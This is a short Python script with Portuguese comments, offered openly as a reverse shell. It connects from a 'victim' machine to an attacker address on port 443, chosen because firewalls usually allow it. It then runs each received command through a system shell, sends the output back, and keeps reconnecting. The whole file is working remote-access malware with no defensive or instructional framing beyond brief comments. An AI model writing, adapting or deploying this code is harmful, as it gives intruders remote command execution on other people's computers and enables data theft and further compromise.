import socket
import subprocess
import os
from time import sleep
# shell reverso
# IP para se conectar com a máquina vitima (Ip ataque)
IP = "192.168.1.xx";
# muito utilizada para conexões em sites, e o firewall normalmente deixa passar
# não é regra para todo mundo
PORT = 443;

def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
        c.connect((ip, port));
        return c;
    except Exception as e:
        print("Erro ao conectar: ", e);
    
    

def listen(c):
    try:
        while True:
            data = c.recv(1024).decode().strip();
            if data == "/exit":
                return;
            else:
                cmd(c, data);
    except Exception as e:
        print("Erro ao receber dados: ", e);    
    
    
def cmd(c, data):
    try:
        if data.startswith("cd "):
            os.chdir(data[3:].strip());
            return 
        
        p = subprocess.Popen(data, shell=True, stdin= subprocess.PIPE, stderr= subprocess.PIPE, stdout= subprocess.PIPE);
        c.send(p.stdout.read() + p.stderr.read()  + b"\n");
    except Exception as e:
        print("Erro ao executar comando: ", e);    
    
        
        
if __name__ == "__main__":
    try:
        while True:
            client = connect(IP, PORT);
            if client:
                listen(client);
            else:
                sleep(.5)
    except KeyboardInterrupt:
        print("Program stopped by user.");            
    except Exception as e:
        print("Main connection error: ", e);            

